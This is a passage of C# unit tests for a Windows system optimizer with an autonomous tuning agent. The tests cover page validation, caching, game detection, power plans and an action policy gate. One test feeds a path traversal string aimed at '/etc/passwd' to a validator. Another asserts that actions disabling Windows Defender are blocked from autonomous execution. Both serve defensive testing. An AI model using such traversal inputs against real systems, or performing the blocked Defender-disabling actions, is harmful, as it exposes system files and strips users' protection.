        public static void TestWebUiPageKeyValidationPublic()
        {
            string[] validPages = new string[] { "dashboard", "quick", "startup", "cleanup", "network", "apps", "ai", "restore", "settings" };
            for (int i = 0; i < validPages.Length; i++)
            {
                Assert(WebUiPageValidator.IsValidPage(validPages[i]), "Valid page: " + validPages[i]);
                Assert(WebUiPageValidator.NormalizePage(validPages[i]) == validPages[i], "Normalized valid page matches");
                Assert(WebUiPageValidator.NormalizePage(validPages[i].ToUpperInvariant()) == validPages[i], "Uppercase normalizes to lowercase");
            }

            Assert(!WebUiPageValidator.IsValidPage(null), "Null page is invalid");
            Assert(!WebUiPageValidator.IsValidPage(""), "Empty page is invalid");
            Assert(!WebUiPageValidator.IsValidPage("   "), "Whitespace page is invalid");
            Assert(!WebUiPageValidator.IsValidPage("malicious_page"), "Unknown page is invalid");
            Assert(!WebUiPageValidator.IsValidPage("../../../etc/passwd"), "Path traversal page is invalid");

            Assert(WebUiPageValidator.NormalizePage(null) == "dashboard", "Null normalizes to dashboard");
            Assert(WebUiPageValidator.NormalizePage("") == "dashboard", "Empty normalizes to dashboard");
            Assert(WebUiPageValidator.NormalizePage("unknown") == "dashboard", "Unknown normalizes to dashboard");
        }

        public static void TestWebUiActionPageMappingPublic()
        {
            Assert(WebUiPageValidator.GetExpectedPageForAction("startup.get-list") == "startup", "startup.get-list maps to startup");
            Assert(WebUiPageValidator.GetExpectedPageForAction("startup.toggle") == "startup", "startup.toggle maps to startup");
            Assert(WebUiPageValidator.GetExpectedPageForAction("cleanup.scan") == "cleanup", "cleanup.scan maps to cleanup");
            Assert(WebUiPageValidator.GetExpectedPageForAction("cleanup.execute") == "cleanup", "cleanup.execute maps to cleanup");
            Assert(WebUiPageValidator.GetExpectedPageForAction("network.get-info") == "network", "network.get-info maps to network");
            Assert(WebUiPageValidator.GetExpectedPageForAction("network.ping") == "network", "network.ping maps to network");
            Assert(WebUiPageValidator.GetExpectedPageForAction("apps.get-processes") == "apps", "apps.get-processes maps to apps");
            Assert(WebUiPageValidator.GetExpectedPageForAction("apps.kill-process") == "apps", "apps.kill-process maps to apps");
            Assert(WebUiPageValidator.GetExpectedPageForAction("ai.get-stats") == "ai", "ai.get-stats maps to ai");
            Assert(WebUiPageValidator.GetExpectedPageForAction("settings.save") == "settings", "settings.save maps to settings");
            Assert(WebUiPageValidator.GetExpectedPageForAction("recovery.create-restore-point") == "restore", "recovery maps to restore");
            Assert(WebUiPageValidator.GetExpectedPageForAction("quick.apply") == "quick", "quick maps to quick");
            Assert(WebUiPageValidator.GetExpectedPageForAction("data.refresh") == "dashboard", "data.refresh defaults to dashboard");
            Assert(WebUiPageValidator.GetExpectedPageForAction(null) == "dashboard", "null action defaults to dashboard");
        }

        public static void TestWebUiStaleResultSuppressionAndGenerationPublic()
        {
            // Scenario 1: Page matches, generation matches -> Not stale
            Assert(!WebUiPageValidator.IsStaleResult("cleanup", 5, "cleanup", 5), "Matching page and gen is not stale");

            // Scenario 2: Active page switched to network while cleanup was in-flight -> Stale
            Assert(WebUiPageValidator.IsStaleResult("network", 6, "cleanup", 5), "Mismatched page is stale");

            // Scenario 3: Same page but older generation (user navigated away and back to cleanup) -> Stale
            Assert(WebUiPageValidator.IsStaleResult("cleanup", 7, "cleanup", 5), "Older generation of same page is stale");

            // Scenario 4: Global response without responsePage -> Not stale
            Assert(!WebUiPageValidator.IsStaleResult("cleanup", 5, null, 0), "Global null page response is not stale");
            Assert(!WebUiPageValidator.IsStaleResult("cleanup", 5, "", 0), "Global empty page response is not stale");

            // Scenario 5: Case insensitivity
            Assert(!WebUiPageValidator.IsStaleResult("Cleanup", 5, "cleanup", 5), "Case-insensitive page matches");
        }

        public static void TestWebUiCleanupScanCachingAndBoundedExecutionPublic()
        {
            // Test 1: Bounded directory size enumeration
            string testDir = Path.Combine(Path.GetTempPath(), "cw_test_bounded_scan_" + Guid.NewGuid().ToString("N"));
            try
            {
                Directory.CreateDirectory(testDir);
                for (int i = 0; i < 30; i++)
                {
                    File.WriteAllText(Path.Combine(testDir, "test_file_" + i + ".tmp"), "sample payload content " + i);
                }

                var swDir = System.Diagnostics.Stopwatch.StartNew();
                long boundedSize = MainWindow.GetSafeDirectorySize(testDir, 10, 1000);
                swDir.Stop();

                Assert(boundedSize > 0, "SafeDirectorySize returned calculated byte count");
                Assert(swDir.ElapsedMilliseconds < 1000, "SafeDirectorySize stopped within timeout");
            }
            finally
            {
                try { if (Directory.Exists(testDir)) Directory.Delete(testDir, true); } catch { }
            }

            // Test 2: Cleanup scan execution and caching
            var swFirst = System.Diagnostics.Stopwatch.StartNew();
            string json1 = MainWindow.GetCleanupScanJson(true);
            swFirst.Stop();

            Assert(!string.IsNullOrEmpty(json1), "GetCleanupScanJson returned non-empty JSON");
            Assert(json1.Contains("\"userTempMb\":"), "JSON contains userTempMb");
            Assert(json1.Contains("\"totalMb\":"), "JSON contains totalMb");

            // Second call with forceRefresh = false must hit cache (< 50ms)
            var swSecond = System.Diagnostics.Stopwatch.StartNew();
            string json2 = MainWindow.GetCleanupScanJson(false);
            swSecond.Stop();

            Assert(json1 == json2, "Cached cleanup scan returned identical payload");
            Assert(swSecond.ElapsedMilliseconds < 50, "Cached cleanup scan returned in <50ms without re-enumerating disk");
        }

        public static void TestWebUiProcessListingSafetyPublic()
        {
            var sw = System.Diagnostics.Stopwatch.StartNew();
            string procsJson = MainWindow.GetProcessesJson();
            sw.Stop();

            Assert(!string.IsNullOrEmpty(procsJson), "GetProcessesJson returned non-empty string");
            Assert(procsJson.StartsWith("[") && procsJson.EndsWith("]"), "GetProcessesJson returned valid JSON array");
            Assert(procsJson.Contains("\"pid\":"), "Processes array contains pid");
            Assert(procsJson.Contains("\"name\":"), "Processes array contains name");
            Assert(procsJson.Contains("\"ramMb\":"), "Processes array contains ramMb");
            Assert(procsJson.Contains("\"isProtected\":"), "Processes array contains isProtected flag");
            Assert(sw.ElapsedMilliseconds < 3000, "Process enumeration completed in <3000ms");
        }

        public static void TestWebUiNavigationStressHarnessPublic()
        {
            string[] pages = new string[] { "dashboard", "quick", "startup", "cleanup", "network", "apps", "ai", "restore", "settings" };
            var rnd = new Random(42);
            int activeGen = 0;
            string activePage = "dashboard";

            var sw = System.Diagnostics.Stopwatch.StartNew();
            int discardedStaleCount = 0;
            int acceptedCurrentCount = 0;

            for (int i = 0; i < 100; i++)
            {
                // Simulate rapid navigation
                string nextTarget = pages[rnd.Next(pages.Length)];
                string normalized = WebUiPageValidator.NormalizePage(nextTarget);
                Assert(WebUiPageValidator.IsValidPage(normalized), "Target page is valid");

                activeGen++;
                activePage = normalized;

                // Simulate an in-flight background response from a previous step
                string inFlightPage = pages[rnd.Next(pages.Length)];
                int inFlightGen = activeGen - rnd.Next(0, 4);

                bool isStale = WebUiPageValidator.IsStaleResult(activePage, activeGen, inFlightPage, inFlightGen);
                if (isStale)
                {
                    discardedStaleCount++;
                }
                else
                {
                    acceptedCurrentCount++;
                    Assert(inFlightPage == activePage, "Accepted result must match active page");
                    Assert(inFlightGen == activeGen, "Accepted result must match current generation");
                }
            }
            sw.Stop();

            Assert(activeGen == 100, "100 navigation cycles completed");
            Assert(discardedStaleCount + acceptedCurrentCount == 100, "All 100 responses correctly evaluated");
            Assert(sw.ElapsedMilliseconds < 500, "100-navigation stress test finished in <500ms");
        }

        public static void TestAiDecisionLoggerPersistenceAndFormattingPublic()
        {
            AiDecisionLogger.Clear();
            AiDecisionLogger.EnsureInitialized();

            var initial = AiDecisionLogger.GetRecentDecisions(10);
            Assert(initial.Count >= 3, "Baseline records seeded on first initialization (got " + initial.Count + ")");

            // Record a new real decision
            AiDecisionLogger.RecordDecision("PurgeStandbyList", "High standby cache pressure detected (RAM 82%)", 0.96, "Memory", "SUCCESS", null, 3);
            AiDecisionLogger.RecordDecision("StabilizeFrames", "Frame presentation jitter detected", 0.98, "Gaming", "SUCCESS", null, 2);

            var list = AiDecisionLogger.GetRecentDecisions(10);
            Assert(list.Count >= 5, "Decision list contains newly recorded records");
            Assert(list[0].Action == "StabilizeFrames", "Latest decision is at the top of the list");
            Assert(list[0].ActionAr.Contains("0.5ms"), "ActionAr is properly localized");
            Assert(list[0].LoadImpact.Contains("0.500ms"), "LoadImpact explains kernel timer resolution reduction");
            Assert(list[1].Action == "PurgeStandbyList", "Second decision is PurgeStandbyList");
            Assert(list[1].LoadImpact.Contains("RAM"), "PurgeStandbyList explains RAM load reduction");

            // Test JSON output
            string json = AiDecisionLogger.GetRecentDecisionsJson(5);
            Assert(json.StartsWith("[") && json.EndsWith("]"), "JSON array returned");
            Assert(json.Contains("\"action\":\"StabilizeFrames\""), "JSON contains action");
            Assert(json.Contains("\"actionAr\":"), "JSON contains actionAr");
            Assert(json.Contains("\"loadImpact\":"), "JSON contains loadImpact");
            Assert(json.Contains("\"confidence\":"), "JSON contains confidence percentage");
        }

        public static void TestAiLoadReductionVerificationPublic()
        {
            var agent = new SmartAgent();
            agent.SetMode(AgentMode.AutoPilot);

            // Verify action details generation for load reduction
            string actionAr, impact;
            AiDecisionLogger.GetActionDetails("PurgeStandbyList", out actionAr, out impact);
            Assert(actionAr.Contains("Standby"), "Action title localized");
            Assert(impact.Contains("300MB") || impact.Contains("RAM"), "Impact specifies memory reduction magnitude");

            AiDecisionLogger.GetActionDetails("LimitBackground", out actionAr, out impact);
            Assert(impact.Contains("20%") || impact.Contains("المعالج"), "Impact specifies CPU contention reduction");

            AiDecisionLogger.GetActionDetails("UnparkAllCores", out actionAr, out impact);
            Assert(impact.Contains("الأنوية") || impact.Contains("20-50ms"), "Impact specifies core wake latency reduction");

            // Verify Decision cycle handles high RAM load
            var state = new SystemState
            {
                CpuUsage = 45,
                RamUsage = 92,
                GpuUsage = 15,
                DiskUsage = 30,
                CpuTemp = 58,
                IsGame = false,
                ActiveProcess = "work.exe"
            };

            agent.EnableSimulation(state);
            agent.Tick();

            var recent = AiDecisionLogger.GetRecentDecisions(10);
            Assert(recent != null && recent.Count > 0, "Decisions were recorded during agent tick under load");

            agent.DisableSimulation();
        }

        public static void TestGameLoopAndEmulatorDetectionPublic()
        {
            var agent = new SmartAgent();
            var method = typeof(SmartAgent).GetMethod("IsGameProcess",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance,
                null,
                new[] { typeof(string), typeof(string) },
                null);

            Assert(method != null, "IsGameProcess method found via reflection");

            // Test GameLoop & Tencent processes
            bool isGameLoop = (bool)method.Invoke(agent, new object[] { "gameloop", @"C:\Program Files\TxGameAssistant\AppMarket\GameLoop.exe" });
            Assert(isGameLoop, "gameloop recognized as game process");

            bool isAow = (bool)method.Invoke(agent, new object[] { "aow_exe", @"C:\Program Files\TxGameAssistant\ui\aow_exe.exe" });
            Assert(isAow, "aow_exe (GameLoop engine) recognized as game process");

            bool isAndroidEmu = (bool)method.Invoke(agent, new object[] { "androidemulator", @"D:\Program Files\txgameassistant\androidemulator.exe" });
            Assert(isAndroidEmu, "androidemulator recognized as game process");

            // Test other popular mobile emulators & PC games
            bool isLdPlayer = (bool)method.Invoke(agent, new object[] { "ldplayer", @"D:\LDPlayer\dnplayer.exe" });
            Assert(isLdPlayer, "ldplayer recognized as game process");

            bool isPubg = (bool)method.Invoke(agent, new object[] { "pubg", @"D:\Steam\steamapps\common\PUBG\TslGame.exe" });
            Assert(isPubg, "pubg recognized as game process");

            // Test non-games (must never be detected as games)
            bool isChrome = (bool)method.Invoke(agent, new object[] { "chrome", @"C:\Program Files\Google\Chrome\Application\chrome.exe" });
            Assert(!isChrome, "chrome excluded from games");

            bool isNotepad = (bool)method.Invoke(agent, new object[] { "notepad", @"C:\Windows\System32\notepad.exe" });
            Assert(!isNotepad, "notepad excluded from games");
        }

        public static void TestGameLoadBalancingDecisionsPublic()
        {
            var agent = new SmartAgent();
            agent.SetMode(AgentMode.AutoPilot);

            // 1. Verify fast tick rate (500ms desktop, 400ms gaming)
            Assert(agent.RecommendedTickMs <= 500, "RecommendedTickMs is fast (<= 500ms)");

            // 2. Verify AiDecisionLogger explains CPU/GPU load balancing
            string actionAr, impact;
            AiDecisionLogger.GetActionDetails("BalanceGameLoad", out actionAr, out impact);
            Assert(actionAr.Contains("المعالج") && actionAr.Contains("الشاشة"), "BalanceGameLoad localized in Arabic");
            Assert(impact.Contains("عنق الزجاجة") || impact.Contains("Bottleneck"), "BalanceGameLoad explains bottleneck relief");

            // 3. Test Game Load Balancing logic under CPU bottleneck
            var state = new SystemState
            {
                CpuUsage = 88,
                GpuUsage = 38,
                RamUsage = 60,
                DiskUsage = 20,
                CpuTemp = 65,
                GpuTemp = 55,
                IsGame = true,
                ActiveProcess = "aow_exe",
                ActiveProcessPath = @"C:\Program Files\TxGameAssistant\ui\aow_exe.exe"
            };

            agent.EnableSimulation(state);
            agent.Tick();

            var recent = AiDecisionLogger.GetRecentDecisions(10);
            Assert(recent != null && recent.Count > 0, "Decisions recorded during game simulation");

            // 4. Verify ExecuteBalanceGameLoad via reflection
            var execMethod = typeof(SmartAgent).GetMethod("ExecuteBalanceGameLoad",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
            Assert(execMethod != null, "ExecuteBalanceGameLoad method found");
            bool res = (bool)execMethod.Invoke(agent, null);
            Assert(res, "ExecuteBalanceGameLoad succeeded");

            agent.DisableSimulation();
        }

        public static void TestTrayAndStartupSettingsPublic()
        {
            // 1 & 2. Test MinimizeToTray & Startup Run registry persistence inside isolated test subkey
            // (never mutates user's real HKCU\SOFTWARE\ClearWin or HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run)
            string regPath = @"SOFTWARE\ClearWin\TestSandbox\Settings";
            string runPath = @"SOFTWARE\ClearWin\TestSandbox\Run";
            string testKeyName = "ClearWin_Test_Startup";
            try
            {
                using (var rk = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath, true))
                {
                    rk.SetValue("MinimizeToTray", 1, Microsoft.Win32.RegistryValueKind.DWord);
                }
                using (var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regPath, false))
                {
                    Assert(rk != null && (int)rk.GetValue("MinimizeToTray") == 1, "MinimizeToTray persisted to isolated test registry");
                }

                using (var rk = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath, true))
                {
                    rk.SetValue("MinimizeToTray", 0, Microsoft.Win32.RegistryValueKind.DWord);
                }
                using (var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regPath, false))
                {
                    Assert(rk != null && (int)rk.GetValue("MinimizeToTray") == 0, "MinimizeToTray reset to 0 in isolated test registry");
                }

                using (var runKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(runPath, true))
                {
                    runKey.SetValue(testKeyName, "\"C:\\Test\\ClearWin.exe\" --minimized", Microsoft.Win32.RegistryValueKind.String);
                }
                using (var runKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runPath, false))
                {
                    object val = runKey != null ? runKey.GetValue(testKeyName) : null;
                    Assert(val != null && val.ToString().Contains("--minimized"), "Startup Run entry contains --minimized parameter");
                }
            }
            finally
            {
                try
                {
                    Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"SOFTWARE\ClearWin\TestSandbox", false);
                }
                catch { }
            }
            using (var runKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runPath, false))
            {
                object val = runKey != null ? runKey.GetValue(testKeyName) : null;
                Assert(val == null, "Isolated Startup Run test subkey successfully cleaned up");
            }

            // 3. Test ApplyPostBootStabilization via Reflection on MainWindow
            var method = typeof(MainWindow).GetMethod("ApplyPostBootStabilization",
                System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Instance);
            Assert(method != null, "ApplyPostBootStabilization method exists on MainWindow");

            var settlerMethod = typeof(MainWindow).GetMethod("StartPostBootSmartSettler",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
            Assert(settlerMethod != null, "StartPostBootSmartSettler method exists on MainWindow");
        }

        public static void TestGameDedicatedGpuAndUltimatePowerPublic()
        {
            // 1. Dynamic GUID detection
            string bestPlan = SmartAgent.FindBestPerformancePlanGuid();
            Assert(!string.IsNullOrEmpty(bestPlan), "FindBestPerformancePlanGuid returns a valid GUID (got: " + bestPlan + ")");

            // 2. Detection of GameLoop / PUBG processes
            var agent = new SmartAgent();
            var method = typeof(SmartAgent).GetMethod("IsGameProcess",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance,
                null,
                new[] { typeof(string), typeof(string) },
                null);
            Assert(method != null, "IsGameProcess method found via reflection");

            bool isAndrows = (bool)method.Invoke(agent, new object[] { "androwsfg", @"D:\Program Files\TxGameAssistant\ui\androwsfg.exe" });
            Assert(isAndrows, "androwsfg recognized as game process");

            bool isLoopEmu = (bool)method.Invoke(agent, new object[] { "gameloopemulator", @"D:\Program Files\TxGameAssistant\ui\gameloopemulator.exe" });
            Assert(isLoopEmu, "gameloopemulator recognized as game process");

            bool isTsl = (bool)method.Invoke(agent, new object[] { "tslgame", @"D:\PUBG\tslgame.exe" });
            Assert(isTsl, "tslgame recognized as game process");

            // 3. Enforce Game Dedicated GPU & Ultimate Power (under DisableRealExecution guard so host Registry/powercfg are untouched)
            bool prevDisable = SmartAgent.DisableRealExecution;
            SmartAgent.DisableRealExecution = true;
            try
            {
                SmartAgent.EnforceGameDedicatedGpuAndPower("aow_exe", @"C:\Program Files\TxGameAssistant\ui\aow_exe.exe");
            }
            finally
            {
                SmartAgent.DisableRealExecution = prevDisable;
            }

            // 4. Verify AiDecisionLogger contains dedicated GPU decision
            var recent = AiDecisionLogger.GetRecentDecisions(5);
            Assert(recent != null && recent.Exists(d => d.Action == "BalanceGameLoad" || d.ActionAr.Contains("كارت الشاشة")), "AiDecisionLogger recorded dedicated GPU routing decision");

            // 5. Test GameGpuPower property on MainWindow
            var prop = typeof(MainWindow).GetProperty("GameGpuPower");
            Assert(prop != null, "GameGpuPower property exists on MainWindow");

            // 6. Test Dynamic Power Plan Discovery & Reversion
            string balancedGuid = SmartAgent.FindBalancedPlanGuid();
            Assert(!string.IsNullOrEmpty(balancedGuid) && balancedGuid.Length == 36, "FindBalancedPlanGuid returns valid GUID");

            string bestPerfGuid = SmartAgent.FindBestPerformancePlanGuid();
            Assert(!string.IsNullOrEmpty(bestPerfGuid) && bestPerfGuid.Length == 36, "FindBestPerformancePlanGuid returns valid GUID");

            bool prevDisable2 = SmartAgent.DisableRealExecution;
            SmartAgent.DisableRealExecution = true;
            bool restored = false;
            try
            {
                restored = SmartAgent.RestoreBalancedOrPreviousPowerPlan(null);
            }
            finally
            {
                SmartAgent.DisableRealExecution = prevDisable2;
            }
            Assert(restored, "RestoreBalancedOrPreviousPowerPlan executes successfully");

            var recentAfterRestore = AiDecisionLogger.GetRecentDecisions(5);
            Assert(recentAfterRestore != null && recentAfterRestore.Exists(d => d.Action == "SwitchPowerPlan" || d.ActionAr.Contains("الخروج من اللعبة")), "AiDecisionLogger recorded power plan restore to Balanced");
        }

        public static void TestSmartAgentGaming60FpsFloorPublic()
        {
            var agent = new SmartAgent();
            agent.SetMode(AgentMode.AutoPilot);

            // 1. Gaming at 28 FPS and 82C (previously throttled at 78C!)
            var gamingDropState = new SystemState
            {
                CpuUsage = 70,
                RamUsage = 65,
                GpuUsage = 85,
                CpuTemp = 82,
                GpuTemp = 75,
                Fps = 28,
                FpsStability = 55,
                Fps1Low = 18,
                IsGame = true,
                ActiveProcess = "aow_exe",
                ProcessCount = 120
            };
            var decDrop = agent.GetOptimizationDecisionForState(gamingDropState);
            Assert(decDrop != null, "Gaming drop produces decision");
            Assert(decDrop.Action == "BoostGamePriority" || decDrop.Action == "StabilizeFrames" || decDrop.Action == "ReduceMicroStutter",
                "Action for low FPS gaming is priority boost or frame stabilization (got: " + decDrop.Action + ")");
            Assert(decDrop.Action != "EmergencyThrottle" && decDrop.Action != "ReduceThermal",
                "Thermal throttling NOT triggered during gaming at 82C");

            // 2. Gaming at 55 FPS and 84C (below 60 FPS floor)
            var gamingNearFloorState = new SystemState
            {
                CpuUsage = 60,
                RamUsage = 60,
                GpuUsage = 80,
                CpuTemp = 84,
                GpuTemp = 78,
                Fps = 55,
                FpsStability = 65,
                Fps1Low = 42,
                IsGame = true,
                ActiveProcess = "aow_exe",
                ProcessCount = 115
            };
            var decFloor = agent.GetOptimizationDecisionForState(gamingNearFloorState);
            Assert(decFloor != null, "Near-floor gaming produces decision");
            Assert(decFloor.Action == "StabilizeFrames" || decFloor.Action == "BoostGamePriority",
                "Action enforces 60 FPS floor (got: " + decFloor.Action + ")");

            // 3. True extreme thermal crisis during gaming (96C)
            var crisisState = new SystemState
            {
                CpuUsage = 95,
                RamUsage = 70,
                GpuUsage = 95,
                CpuTemp = 96,
                GpuTemp = 90,
                Fps = 30,
                IsGame = true,
                ActiveProcess = "aow_exe",
                ProcessCount = 120
            };
            var decCrisis = agent.GetOptimizationDecisionForState(crisisState);
            Assert(decCrisis != null && decCrisis.Action == "EmergencyThrottle",
                "Extreme hardware crisis (96C) triggers thermal safety (got: " + (decCrisis != null ? decCrisis.Action : "null") + ")");

            // 4. Test ExecuteAggressive60FpsLock directly
            bool lockExecuted = agent.ExecuteAggressive60FpsLock(28);
            Assert(lockExecuted, "ExecuteAggressive60FpsLock executes successfully");

            // 5. Verify AiDecisionLogger contains the aggressive 60 FPS floor log
            var recent = AiDecisionLogger.GetRecentDecisions(5);
            Assert(recent != null && recent.Exists(d => d.Action == "StabilizeFrames" || d.ActionAr.Contains("60 FPS") || d.ActionAr.Contains("قفل الفريمات")),
                "AiDecisionLogger recorded aggressive 60 FPS floor entry");
        }

        public static void TestAppClassificationAndGameLoopPubgDetectionPublic()
        {
            // 1. Process Classification Engine categories
            Assert(SmartAgent.ClassifyProcess("aow_exe", @"C:\Program Files\TxGameAssistant\ui\aow_exe.exe", "PUBG MOBILE") == ProcessCategory.Game,
                "aow_exe with PUBG title classifies as Game");

            Assert(SmartAgent.ClassifyProcess("appmarket", @"C:\Program Files\TxGameAssistant\AppMarket\AppMarket.exe", "PUBG MOBILE") == ProcessCategory.Game,
                "appmarket with PUBG title classifies as Game");

            Assert(SmartAgent.ClassifyProcess("androidprocess", @"C:\Program Files\TxGameAssistant\ui\androidprocess.exe", "") == ProcessCategory.Game,
                "androidprocess classifies as Game");

            Assert(SmartAgent.ClassifyProcess("tslgame", @"D:\PUBG\tslgame.exe", "PUBG: BATTLEGROUNDS") == ProcessCategory.Game,
                "tslgame classifies as Game");

            Assert(SmartAgent.ClassifyProcess("chrome", @"C:\Program Files\Google\Chrome\Application\chrome.exe", "Google Chrome") == ProcessCategory.Productivity,
                "chrome classifies as Productivity");

            Assert(SmartAgent.ClassifyProcess("code", @"C:\Users\maher\AppData\Local\Programs\Microsoft VS Code\Code.exe", "Visual Studio Code") == ProcessCategory.Productivity,
                "code classifies as Productivity");

            Assert(SmartAgent.ClassifyProcess("devenv", @"C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\devenv.exe", "Solution - Visual Studio") == ProcessCategory.Productivity,
                "devenv classifies as Productivity");

            Assert(SmartAgent.ClassifyProcess("explorer", @"C:\Windows\explorer.exe", "") == ProcessCategory.WindowsSystem,
                "explorer classifies as WindowsSystem");

            Assert(SmartAgent.ClassifyProcess("svchost", @"C:\Windows\System32\svchost.exe", "") == ProcessCategory.WindowsSystem,
                "svchost classifies as WindowsSystem");

            Assert(SmartAgent.ClassifyProcess("services", @"C:\Windows\System32\services.exe", "") == ProcessCategory.WindowsSystem,
                "services classifies as WindowsSystem");

            Assert(SmartAgent.ClassifyProcess("googleupdate", @"C:\Program Files\Google\Update\GoogleUpdate.exe", "") == ProcessCategory.BackgroundService,
                "googleupdate classifies as BackgroundService");

            // 2. Window Hierarchy & PUBG in GameLoop resolution
            var agent = new SmartAgent();
            var isGameMethod = typeof(SmartAgent).GetMethod("IsGameProcess",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance,
                null,
                new[] { typeof(string), typeof(string) },
                null);
            Assert(isGameMethod != null, "IsGameProcess found via reflection");

            bool isAowGame = (bool)isGameMethod.Invoke(agent, new object[] { "aow_exe", @"C:\Program Files\TxGameAssistant\ui\aow_exe.exe" });
            Assert(isAowGame, "aow_exe recognized as game in SmartAgent");

            bool isPubgMobile = (bool)isGameMethod.Invoke(agent, new object[] { "pubgmobile", @"D:\Emulators\pubgmobile.exe" });
            Assert(isPubgMobile, "pubgmobile recognized as game in SmartAgent");
        }

        public static void TestAiAutonomyAndDeadlockFreeSafetyPublic()
        {
            var agent = new SmartAgent();

            // 1. Full autonomy allowlist verification
            string[] safeActions = new[]
            {
                "BoostGamePriority", "StabilizeFrames", "ReduceMicroStutter", "UnparkAllCores",
                "PurgeStandbyList", "PreemptiveClean", "AggressiveClean", "SetGameAffinity",
                "LimitBackground", "SetLowIoPriority", "BalancedPerformance", "BatterySaver",
                "OptimizeGameLoop", "BalanceGameLoad", "LightClean", "CleanTempFiles", "FlushDnsCache"
            };

            foreach (var act in safeActions)
            {
                bool allowed = SmartAgent.IsFullAutonomyAllowlisted(act);
                Assert(allowed, "Action " + act + " is allowlisted for full autonomy without user prompts");
            }

            // Dangerous actions must NOT be allowlisted for autonomous execution
            bool dangerousAllowed = SmartAgent.IsFullAutonomyAllowlisted("DisableDefender");
            Assert(!dangerousAllowed, "DisableDefender is strictly blocked from autonomous execution");

            // 2. ActionPolicyGate Green autonomy default is enabled
            Assert(ActionPolicyGate.GreenAutonomyEnabled, "ActionPolicyGate.GreenAutonomyEnabled is true by default");

            // Green actions evaluate to Allowed autonomously
            var resGreen = ActionPolicyGate.Evaluate("optimization.ram_clean", ActionRequester.SmartAgent, false, false);
            Assert(resGreen.Allowed, "optimization.ram_clean allowed autonomously under default Green autonomy");

            // Red actions evaluate to Blocked_RedTier under normal conditions
            var resRed = ActionPolicyGate.Evaluate("tweak:disable-defender-rtp", ActionRequester.SmartAgent, false, false);
            Assert(!resRed.Allowed && resRed.Status == PolicyEvaluationStatus.Blocked_RedTier, "Red actions blocked autonomously under normal conditions");

            // 3. Hardware emergency override for protective thermal cooling
            agent.EnableSimulation(new SystemState { CpuTemp = 97.0 });
            SmartAgent.Instance = agent;
            var resEmergency = ActionPolicyGate.Evaluate("system.emergency_cool", ActionRequester.SmartAgent, false, false);
            Assert(resEmergency.Allowed, "Hardware emergency (CpuTemp >= 95C) permits emergency cool action to protect silicon");
            agent.DisableSimulation();
        }

        public static void TestNeuralEnsembleWeightsAndConfidencePublic()
        {
            var agent = new SmartAgent();
            agent.SetMode(AgentMode.AutoPilot);

            // Verify decisions across 5 distinct system workload profiles
            // Profile 1: Intense Gaming with Frame Drops
            var gamingDrop = new SystemState
            {
                CpuUsage = 75,
                RamUsage = 68,
                GpuUsage = 88,
                CpuTemp = 78,
                Fps = 25,
                FpsStability = 45,
                Fps1Low = 14,
                IsCharging = true,
                BatteryLevel = 100,
                IsGame = true,
                ActiveProcess = "aow_exe",
                ActiveCategory = ProcessCategory.Game
            };
            var decGaming = agent.GetOptimizationDecisionForState(gamingDrop);
            Assert(decGaming != null, "Gaming workload produces optimization decision");
            Assert(decGaming.Confidence >= 0.75, "Gaming decision has high confidence (got: " + decGaming.Confidence + ")");
            Assert(decGaming.Action == "BoostGamePriority" || decGaming.Action == "StabilizeFrames" || decGaming.Action == "ReduceMicroStutter",
                "Gaming decision stabilizes frames or boosts priority");

            // Profile 2: Extreme Memory Saturation
            var memSaturated = new SystemState
            {
                CpuUsage = 30,
                RamUsage = 94,
                GpuUsage = 10,
                CpuTemp = 50,
                IsCharging = true,
                BatteryLevel = 100,
                IsGame = false,
                ActiveProcess = "chrome.exe",
                ActiveCategory = ProcessCategory.Productivity
            };
            var decMem = agent.GetOptimizationDecisionForState(memSaturated);
            Assert(decMem != null, "Memory saturation produces decision");
            Assert(decMem.Action == "PurgeStandbyList" || decMem.Action == "AggressiveClean" || decMem.Action == "PreemptiveClean",
                "Memory saturation triggers memory reduction action (got: " + decMem.Action + ")");

            // Profile 3: Background CPU Spike during Productivity
            var cpuSpike = new SystemState
            {
                CpuUsage = 92,
                RamUsage = 68,
                GpuUsage = 5,
                CpuTemp = 62,
                IsCharging = true,
                BatteryLevel = 100,
                IsGame = false,
                ActiveProcess = "code.exe",
                ActiveCategory = ProcessCategory.Productivity,
                ProcessCount = 180
            };
            var decCpu = agent.GetOptimizationDecisionForState(cpuSpike);
            Assert(decCpu != null, "CPU spike produces decision");
            Assert(decCpu.Action == "LimitBackground" || decCpu.Action == "SetLowIoPriority" || decCpu.Action == "BalancedPerformance" || decCpu.Action == "UnparkAllCores",
                "CPU spike throttles background contention (got: " + (decCpu != null ? decCpu.Action : "null") + ")");

            // Profile 4: Extreme Thermal Surge
            var thermalSurge = new SystemState
            {
                CpuUsage = 95,
                RamUsage = 70,
                GpuUsage = 90,
                CpuTemp = 96,
                IsCharging = true,
                BatteryLevel = 100,
                IsGame = true,
                ActiveProcess = "PUBG Mobile (GameLoop)",
                ActiveCategory = ProcessCategory.Game
            };
            var decThermal = agent.GetOptimizationDecisionForState(thermalSurge);
            Assert(decThermal != null && decThermal.Action == "EmergencyThrottle",
                "Extreme thermal surge (96C) triggers EmergencyThrottle to protect CPU");

            // Profile 5: Ideal Idle State
            var idleState = new SystemState
            {
                CpuUsage = 5,
                RamUsage = 35,
                GpuUsage = 2,
                CpuTemp = 42,
                IsCharging = true,
                BatteryLevel = 100,
                IsGame = false,
                ActiveProcess = "explorer.exe",
                ActiveCategory = ProcessCategory.WindowsSystem
            };
            var decIdle = agent.GetOptimizationDecisionForState(idleState);
            // Idle state either has no urgent action or BalancedPerformance / BatterySaver
